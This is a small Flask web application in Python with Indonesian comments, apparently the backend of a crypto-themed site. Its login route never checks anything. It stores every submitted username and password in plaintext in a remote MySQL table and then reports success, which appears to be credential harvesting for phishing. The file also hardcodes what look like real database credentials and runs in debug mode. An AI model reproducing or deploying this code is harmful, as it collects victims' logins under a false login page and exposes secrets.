from flask import Flask, render_template, request, redirect, url_for
import mysql.connector
import os

app = Flask(__name__)

# Konfigurasi Database
db_config = {
    'user': 'crypto_warmbasis',
    'password': 'd2dbf9edb95d7fc8c28b6ec3feb01fd716086831',
    'host': 'r4dnc.h.filess.io',
    'port': 3305,
    'database': 'crypto_warmbasis'
}

@app.route('/')
def loading():
    return render_template('loading.html')

@app.route('/index')
def index():
    return render_template('index.html')

@app.route('/halamanlogin.html')
def login_page():
    return render_template('halamanlogin.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Simpan data login ke database tabel login_user
    try:
        conn = mysql.connector.connect(**db_config)
        cursor = conn.cursor()
        cursor.execute("INSERT INTO login_user (username, password) VALUES (%s, %s)", (username, password))
        conn.commit()
    except mysql.connector.Error as err:
        return f'Error: {err}', 500
    finally:
        cursor.close()
        conn.close()

    return render_template('sukses.html')

if __name__ == '__main__':
    app.run(debug=True)
